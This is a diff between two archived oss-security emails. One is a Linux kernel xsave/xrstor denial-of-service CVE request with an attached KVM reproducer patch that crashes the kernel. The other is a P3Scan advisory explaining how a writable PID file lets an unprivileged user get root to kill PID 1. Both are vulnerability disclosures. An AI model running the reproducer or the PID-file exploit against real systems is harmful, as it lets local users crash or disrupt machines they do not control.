@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["13221" "Wednesday" "18" "March" "2015" "11:14:05" "+0100" "Quentin Casasnovas" "quentin.casasnovas@oracle.com" "<20150318101405.GA19065@chrystal.uk.oracle.com>" "250" "[oss-security] CVE Request: Linux kernel unprivileged denial-of-service due to mis-protected xsave/xrstor instructions." nil nil nil "3" "2015031810:14:05" "[oss-security] CVE Request: Linux kernel unprivileged denial-of-service due to mis-protected xsave/xrstor instructions." (number mark "        quentin.casa Mar 18  250/13221 " thread-indent "\"[oss-security] CVE Request: Linux kernel unprivileged denial-of-service due to mis-protected xsave/xrstor instructions.\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["3421" "Thursday" "21" "September" "2017" "19:53:54" "-0400" "Michael Orlitzky" "michael@orlitzky.com" "<c7a49799-a042-656d-874e-c5da9f0cf0aa@orlitzky.com>" "108" "[oss-security] CVE-2017-14681: P3Scan privilege escalation via PID file manipulation" nil nil nil "9" "2017092123:53:54" "[oss-security] CVE-2017-14681: P3Scan privilege escalation via PID file manipulation" (number mark "U       michael@orli Sep 21  108/3421  " thread-indent "\"[oss-security] CVE-2017-14681: P3Scan privilege escalation via PID file manipulation\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0001
+X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 17837 invoked by uid 550); 18 Mar 2015 10:17:26 -0000
+Received: (qmail 32661 invoked by uid 550); 21 Sep 2017 23:54:17 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,269 +11,131 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 13369 invoked from network); 18 Mar 2015 10:12:18 -0000
-Message-ID: <20150318101405.GA19065@chrystal.uk.oracle.com>
-MIME-Version: 1.0
-Content-Type: multipart/mixed; boundary="YiEDa0DAkWCtVeE4"
-Content-Disposition: inline
-User-Agent: Mutt/1.5.22 (2013-10-16)
-X-Source-IP: userv0022.oracle.com [156.151.31.74]
-Cc: Jamie Iles <jamie.iles@oracle.com>, Allan Xavier <mr.a.xavier@gmail.com>
-Date: Wed, 18 Mar 2015 11:14:05 +0100
-From: Quentin Casasnovas <quentin.casasnovas@oracle.com>
 Reply-To: oss-security@lists.openwall.com
-Subject: [oss-security] CVE Request: Linux kernel unprivileged denial-of-service due to
- mis-protected xsave/xrstor instructions.
-To: CVE-assign <cve-assign@mitre.org>,
-        oss-sec <oss-security@lists.openwall.com>
+Received: (qmail 32641 invoked from network); 21 Sep 2017 23:54:16 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=simple/simple; d=orlitzky.com; s=mail2;
+	t=1506038044; bh=6UHJDnk8CzPTjahoqfHazs6iLfOSwMMA+bOrvHAkeu8=;
+	h=To:From:Subject:Date;
+	b=eAU2Tp9DWi+2RIo1LmftD/sF2G/k9UNUkFtsAcOYNA38aQ4zFmt0No4txjOCFmeL0
+	 Op8itUYC/2Ow8GLihYqyolmlgwS9qF/WHcstfhQScaGwXWjrf2zLYSCGKLFublmZ77
+	 SSZsWk/RMyKCdPuaAcnS9oVlv5OhFlakksWswmpw=
+To: oss-security <oss-security@lists.openwall.com>
+From: Michael Orlitzky <michael@orlitzky.com>
+Message-ID: <c7a49799-a042-656d-874e-c5da9f0cf0aa@orlitzky.com>
+Date: Thu, 21 Sep 2017 19:53:54 -0400
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101
+ Thunderbird/52.2.0
+MIME-Version: 1.0
+Content-Type: text/plain; charset=utf-8
+Content-Language: en-US
+Content-Transfer-Encoding: 8bit
+Subject: [oss-security] CVE-2017-14681: P3Scan privilege escalation via PID file manipulation
 
---YiEDa0DAkWCtVeE4
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: inline
-
-Hi,
-
-Jamie and I discovered there was a flaw in the way the xsave/xrstor (and
-their alternative instructions) were being protected against a fault in
-kernel space from linux 3.15.  The problem was introduced in commit f31a9f7
-("x86/xsaves: Use xsaves/xrstors to save and restore xsave area") which
-ends up protecting the .altinstr_replacement from faulting instead of the
-target of the alternative in .text, leaving the instruction un-protected.
-
-You can find a reproducer (thanks to Allan for his help with/comments on
-it!) triggering the fault in kernel space attached to this e-mail but it
-should be noted there are a few different places where these instructions
-are used un-protected and the reproducer only uses one of them present in
-the kvm code.  You can find a list of all such places in the attached
-unprotected_xsave_faults attachment which was generated against a v4.0-rc1
-defconfig + CONFIG_KVM vmlinux.o (the most concerning one probably being in
-__switch_to()).  The reproducer is a patch to apply on top of lkvm
-(https://github.com/penberg/linux-kvm) but it should be trivial to write as
-a standalone C application.
-
-It should be noted that this vulnerability is present even if the hardware
-does not support xsaveS.
-
-This is fixed by upstream commit 06c8173eb:
-
-  https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit?id=06c8173eb92bbfc03a0fe8bb64315857d0badd06
-
-Other patches to prevent introduction of the same class of vulnerability
-are currently being reviewed on lkml:
-
-  https://lkml.org/lkml/2015/3/17/462
-
-I haven't received any news from cve-assign when this issue was previously
-discussed on security@kernel.org.  Could a CVE be assigned to this please?
-
-Thanks,
-Quentin
-
---YiEDa0DAkWCtVeE4
-Content-Type: text/x-diff; charset=us-ascii
-Content-Disposition: attachment; filename="xsave-fault-reproducer.patch"
-
->From 5d7427ace0a94f842610a9823d5230335dbae301 Mon Sep 17 00:00:00 2001
-From: Quentin Casasnovas <quentin.casasnovas@oracle.com>
-Subject: [PATCH] lkvm: hack the fpu for fun and profit.
-
-Signed-off-by: Quentin Casasnovas <quentin.casasnovas@oracle.com>
----
- tools/kvm/kvm-cpu.c | 61 +++++++++++++++++++++++++++++++++++++++++++++++++++++
- 1 file changed, 61 insertions(+)
-
-diff --git tools/kvm/kvm-cpu.c tools/kvm/kvm-cpu.c
-index 5d90664..87d9641 100644
---- tools/kvm/kvm-cpu.c
-+++ tools/kvm/kvm-cpu.c
-@@ -30,6 +30,65 @@ void kvm_cpu__enable_singlestep(struct kvm_cpu *vcpu)
- 		pr_warning("KVM_SET_GUEST_DEBUG failed");
- }
- 
-+static struct kvm_xsave xsave;
-+
-+static void kvm__sighandler(int signum, siginfo_t* infop, void* context_p)
-+{
-+	ucontext_t* context = context_p;
-+	struct sigcontext* scontext = (void *) &context->uc_mcontext;
-+	struct _fpstate* fpstate = scontext->fpstate;
-+	/* uint64_t* xstate_bv = (void*) (fpstate + 1); */
-+	/* uint64_t* xcomp_bv = xstate_bv + 1; */
-+
-+	memcpy(&xsave, fpstate, sizeof(*fpstate));
-+
-+	return;
-+}
-+
-+static void kvm__install_handler(void)
-+{
-+	struct sigaction sa = {
-+		.sa_sigaction = kvm__sighandler
-+	};
-+
-+	sigfillset(&sa.sa_mask);
-+	sa.sa_flags = SA_SIGINFO;
-+
-+	sigaction(SIGUSR1, &sa, NULL);
-+}
-+
-+static void kvm__copy_xsave_from_signal_stack(void)
-+{
-+	static int already_installed = 0;
-+
-+	if (already_installed)
-+		return;
-+
-+	kvm__install_handler();
-+	raise(SIGUSR1);
-+	already_installed = 1;
-+}
-+
-+static void kvm__hijack_xsave(struct kvm_cpu* vcpu)
-+{
-+	int err = 0;
-+	struct _fpstate *fpstate = (void*) &xsave;
-+
-+	fpstate->mxcsr = ~0U;
-+
-+	err = ioctl(vcpu->vcpu_fd, KVM_SET_XSAVE, fpstate);
-+	if (err)
-+		die_perror("KVM_GET_XSAVE failed");
-+}
-+
-+static void kvm_cpu__mess_fpu(struct kvm_cpu* vcpu)
-+{
-+	kvm__copy_xsave_from_signal_stack();
-+	kvm__hijack_xsave(vcpu);
-+
-+	return;
-+}
-+
- void kvm_cpu__run(struct kvm_cpu *vcpu)
- {
- 	int err;
-@@ -37,6 +96,8 @@ void kvm_cpu__run(struct kvm_cpu *vcpu)
- 	if (!vcpu->is_running)
- 		return;
- 
-+	kvm_cpu__mess_fpu(vcpu);
-+
- 	err = ioctl(vcpu->vcpu_fd, KVM_RUN, 0);
- 	if (err < 0 && (errno != EINTR && errno != EAGAIN))
- 		die_perror("KVM_RUN failed");
--- 
-2.0.5
+Product: P3Scan (transparent email proxy server)
+Versions-affected: 3.0_rc1 and earlier (all versions)
+Bug-report: https://sourceforge.net/p/p3scan/bugs/33/
+Author: Michael Orlitzky
 
 
---YiEDa0DAkWCtVeE4
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: attachment; filename=unprotected_xsave_faults
+== Summary ==
 
-Error: found a reference to .altinstr_replacement in __ex_table:
-	xrstor_state at /home/quentin/linux-2.6/./arch/x86/include/asm/xsave.h:179
-	 (inlined by) fpu_xrstor_checking at /home/quentin/linux-2.6/./arch/x86/include/asm/xsave.h:207
-	 (inlined by) fpu_restore_checking at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:284
-	 (inlined by) kvm_load_guest_fpu at /home/quentin/linux-2.6/arch/x86/kvm/x86.c:6986
-Error: found a reference to .altinstr_replacement in __ex_table:
-	xsave_state at /home/quentin/linux-2.6/./arch/x86/include/asm/xsave.h:150
-	 (inlined by) fpu_xsave at /home/quentin/linux-2.6/./arch/x86/include/asm/xsave.h:199
-	 (inlined by) fpu_save_init at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:246
-	 (inlined by) kvm_put_guest_fpu at /home/quentin/linux-2.6/arch/x86/kvm/x86.c:6998
-Error: found a reference to .altinstr_replacement in __ex_table:
-	xsave_state at /home/quentin/linux-2.6/./arch/x86/include/asm/xsave.h:150
-	 (inlined by) fpu_xsave at /home/quentin/linux-2.6/./arch/x86/include/asm/xsave.h:199
-	 (inlined by) fpu_save_init at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:246
-	 (inlined by) __save_init_fpu at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:278
-	 (inlined by) switch_fpu_prepare at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:432
-	 (inlined by) __switch_to at /home/quentin/linux-2.6/arch/x86/kernel/process_64.c:284
-Error: found a reference to .altinstr_replacement in __ex_table:
-	xrstor_state at /home/quentin/linux-2.6/./arch/x86/include/asm/xsave.h:179
-	 (inlined by) fpu_xrstor_checking at /home/quentin/linux-2.6/./arch/x86/include/asm/xsave.h:207
-	 (inlined by) fpu_restore_checking at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:284
-	 (inlined by) restore_fpu_checking at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:306
-	 (inlined by) switch_fpu_finish at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:468
-	 (inlined by) __switch_to at /home/quentin/linux-2.6/arch/x86/kernel/process_64.c:399
-Error: found a reference to .altinstr_replacement in __ex_table:
-	xrstor_state at /home/quentin/linux-2.6/./arch/x86/include/asm/xsave.h:179
-	 (inlined by) drop_init_fpu at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:383
-	 (inlined by) switch_fpu_finish at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:469
-	 (inlined by) __switch_to at /home/quentin/linux-2.6/arch/x86/kernel/process_64.c:399
-Error: found a reference to .altinstr_replacement in __ex_table:
-	xrstor_state at /home/quentin/linux-2.6/./arch/x86/include/asm/xsave.h:179
-	 (inlined by) drop_init_fpu at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:383
-	 (inlined by) handle_signal at /home/quentin/linux-2.6/arch/x86/kernel/signal.c:682
-	 (inlined by) do_signal at /home/quentin/linux-2.6/arch/x86/kernel/signal.c:705
-Error: found a reference to .altinstr_replacement in __ex_table:
-	xrstor_state at /home/quentin/linux-2.6/./arch/x86/include/asm/xsave.h:179
-	 (inlined by) fpu_xrstor_checking at /home/quentin/linux-2.6/./arch/x86/include/asm/xsave.h:207
-	 (inlined by) fpu_restore_checking at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:284
-	 (inlined by) restore_fpu_checking at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:306
-	 (inlined by) math_state_restore at /home/quentin/linux-2.6/arch/x86/kernel/traps.c:865
-Error: found a reference to .altinstr_replacement in __ex_table:
-	xrstor_state at /home/quentin/linux-2.6/./arch/x86/include/asm/xsave.h:179
-	 (inlined by) drop_init_fpu at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:383
-	 (inlined by) math_state_restore at /home/quentin/linux-2.6/arch/x86/kernel/traps.c:866
-Error: found a reference to .altinstr_replacement in __ex_table:
-	xsave_state at /home/quentin/linux-2.6/./arch/x86/include/asm/xsave.h:150
-	 (inlined by) __save_fpu at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:517
-	 (inlined by) save_init_fpu at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:530
-	 (inlined by) math_error at /home/quentin/linux-2.6/arch/x86/kernel/traps.c:737
-Error: found a reference to .altinstr_replacement in __ex_table:
-	xsave_state at /home/quentin/linux-2.6/./arch/x86/include/asm/xsave.h:150
-	 (inlined by) fpu_xsave at /home/quentin/linux-2.6/./arch/x86/include/asm/xsave.h:199
-	 (inlined by) fpu_save_init at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:246
-	 (inlined by) __save_init_fpu at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:278
-	 (inlined by) save_init_fpu at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:535
-	 (inlined by) math_error at /home/quentin/linux-2.6/arch/x86/kernel/traps.c:737
-Error: found a reference to .altinstr_replacement in __ex_table:
-	xsave_state at /home/quentin/linux-2.6/./arch/x86/include/asm/xsave.h:150
-	 (inlined by) __save_fpu at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:517
-	 (inlined by) fpu_copy at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:598
-	 (inlined by) arch_dup_task_struct at /home/quentin/linux-2.6/arch/x86/kernel/process.c:78
-Error: found a reference to .altinstr_replacement in __ex_table:
-	xrstor_state at /home/quentin/linux-2.6/./arch/x86/include/asm/xsave.h:179
-	 (inlined by) drop_init_fpu at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:383
-	 (inlined by) flush_thread at /home/quentin/linux-2.6/arch/x86/kernel/process.c:134
-Error: found a reference to .altinstr_replacement in __ex_table:
-	xsave_state at /home/quentin/linux-2.6/./arch/x86/include/asm/xsave.h:150
-	 (inlined by) fpu_xsave at /home/quentin/linux-2.6/./arch/x86/include/asm/xsave.h:199
-	 (inlined by) fpu_save_init at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:246
-	 (inlined by) __save_init_fpu at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:278
-	 (inlined by) __kernel_fpu_begin at /home/quentin/linux-2.6/arch/x86/kernel/i387.c:96
-Error: found a reference to .altinstr_replacement in __ex_table:
-	xsave_state at /home/quentin/linux-2.6/./arch/x86/include/asm/xsave.h:150
-	 (inlined by) fpu_xsave at /home/quentin/linux-2.6/./arch/x86/include/asm/xsave.h:199
-	 (inlined by) fpu_save_init at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:246
-	 (inlined by) __save_init_fpu at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:278
-	 (inlined by) unlazy_fpu at /home/quentin/linux-2.6/arch/x86/kernel/i387.c:123
-Error: found a reference to .altinstr_replacement in __ex_table:
-	xrstor_state at /home/quentin/linux-2.6/./arch/x86/include/asm/xsave.h:179
-	 (inlined by) fpu_xrstor_checking at /home/quentin/linux-2.6/./arch/x86/include/asm/xsave.h:207
-	 (inlined by) fpu_restore_checking at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:284
-	 (inlined by) restore_fpu_checking at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:306
-	 (inlined by) __kernel_fpu_end at /home/quentin/linux-2.6/arch/x86/kernel/i387.c:109
-Error: found a reference to .altinstr_replacement in __ex_table:
-	xrstor_state at /home/quentin/linux-2.6/./arch/x86/include/asm/xsave.h:179
-	 (inlined by) drop_init_fpu at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:383
-	 (inlined by) __kernel_fpu_end at /home/quentin/linux-2.6/arch/x86/kernel/i387.c:110
-Error: found a reference to .altinstr_replacement in __ex_table:
-	xrstor_state at /home/quentin/linux-2.6/./arch/x86/include/asm/xsave.h:173
-	 (inlined by) restore_user_xstate at /home/quentin/linux-2.6/arch/x86/kernel/xsave.c:319
-	 (inlined by) __restore_xstate_sig at /home/quentin/linux-2.6/arch/x86/kernel/xsave.c:417
-Error: found a reference to .altinstr_replacement in __ex_table:
-	xrstor_state at /home/quentin/linux-2.6/./arch/x86/include/asm/xsave.h:179
-	 (inlined by) drop_init_fpu at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:383
-	 (inlined by) __restore_xstate_sig at /home/quentin/linux-2.6/arch/x86/kernel/xsave.c:418
-Error: found a reference to .altinstr_replacement in __ex_table:
-	xrstor_state at /home/quentin/linux-2.6/./arch/x86/include/asm/xsave.h:179
-	 (inlined by) drop_init_fpu at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:383
-	 (inlined by) __restore_xstate_sig at /home/quentin/linux-2.6/arch/x86/kernel/xsave.c:345
-Error: found a reference to .altinstr_replacement in __ex_table:
-	xrstor_state at /home/quentin/linux-2.6/./arch/x86/include/asm/xsave.h:173
-	 (inlined by) restore_user_xstate at /home/quentin/linux-2.6/arch/x86/kernel/xsave.c:324
-	 (inlined by) __restore_xstate_sig at /home/quentin/linux-2.6/arch/x86/kernel/xsave.c:417
-Error: found a reference to .altinstr_replacement in __ex_table:
-	xrstor_state at /home/quentin/linux-2.6/./arch/x86/include/asm/xsave.h:179
-	 (inlined by) eager_fpu_init at /home/quentin/linux-2.6/arch/x86/kernel/xsave.c:715
+The p3scan daemon creates its PID file after dropping privileges to a
+non-root user. That may be exploited (through init scripts or other
+management tools) by the unprivileged user to kill root processes, since
+when the daemon is stopped, root usually sends a SIGTERM to the contents
+of the PID file (which are under the control of the runtime user).
+P3Scan itself ships two init scripts vulnerable to this attack.
 
---YiEDa0DAkWCtVeE4--
+
+== Details ==
+
+The purpose of the PID file is to hold the PID of the running daemon, so
+that later it can be stopped, restarted, or otherwise signaled (many
+daemons reload their configurations in response to a SIGHUP). To fulfil
+that purpose, the contents of the PID file need to be trustworthy. If
+the PID file is writable by a non-root user, then he can replace its
+contents with the PID of a root process. Afterwards, any attempt to
+signal the PID contained in the PID file will instead signal a root
+process chosen by the non-root user.
+
+The creation of the PID file can be traced to the following code in
+p3scan.c (modulo some whitespace changes):
+
+  cuid=getuid();
+
+  if (cuid == 0) {
+    do_log(LOG_DEBUG, "Changing uid (we are root)");
+    pws = getpwnam(config->runasuser);
+
+    // Emergency: main: Unknown user in configuration file
+    if (pws == NULL)
+      do_log(LOG_EMERG,
+             "ERR: Unknown User '%s'",
+             config->runasuser);
+
+    if (setgid(pws->pw_gid))
+      do_log(LOG_DEBUG,
+             "setgid returned: %s",
+             strerror(errno));
+
+    if (setuid(pws->pw_uid))
+      do_log(LOG_DEBUG,
+             "setuid returned: %s",
+             strerror(errno));
+  }
+
+  cuid=getuid();
+  guid=getgid();
+  pws = getpwuid(cuid);
+  grp = getgrgid(guid);
+  do_log(LOG_DEBUG,
+         "Running as user: %s group: %s",
+         pws->pw_name,
+         grp->gr_name);
+
+  if ((pd=fopen(config->pidfile, "w+")) != NULL) {
+    fprintf(pd, "%i\n", getpid());
+    fclose(pd);
+  }
+
+This is commonly exploitable through init scripts that are run as root
+and which blindly trust the contents of their PID files. The p3scan
+package ships two such init scripts,
+
+  1. etc/init.d/p3scan
+  2. etc/rc.d/rc.p3scan
+
+both containing essentially the same code:
+
+  stop)
+     # Stop p3scan
+     if [ -a /var/run/p3scan/p3scan.pid ]; then
+        kill `cat /var/run/p3scan/p3scan.pid` &>/dev/null
+        rm -f /var/run/p3scan/p3scan.pid
+        echo "P3Scan terminated"
+
+P3Scan is unable to run in the foreground, preventing the typical
+workaround where the init system is allowed to manage its PID file.
+
+
+== Exploitation ==
+
+An example exploit involving an init script is,
+
+  1. I run "/etc/init.d/p3scan start" to start the daemon.
+
+  2. p3scan drops to the "p3scan" user.
+
+  3. p3scan writes its PID file, now owned by the "p3scan" user.
+
+  4. Someone compromises the daemon, which sits on the network.
+
+  5. The attacker is generally limited in what he can do because the
+     daemon doesn't run as root. However, he can write "1" into the PID
+     file, and he does.
+
+  6. I run "/etc/init.d/p3scan stop" to stop the daemon while I
+     investigate the weird behavior resulting from the hack.
+
+  7. The machine reboots, because I killed PID 1 (this is normally
+     restricted to root).
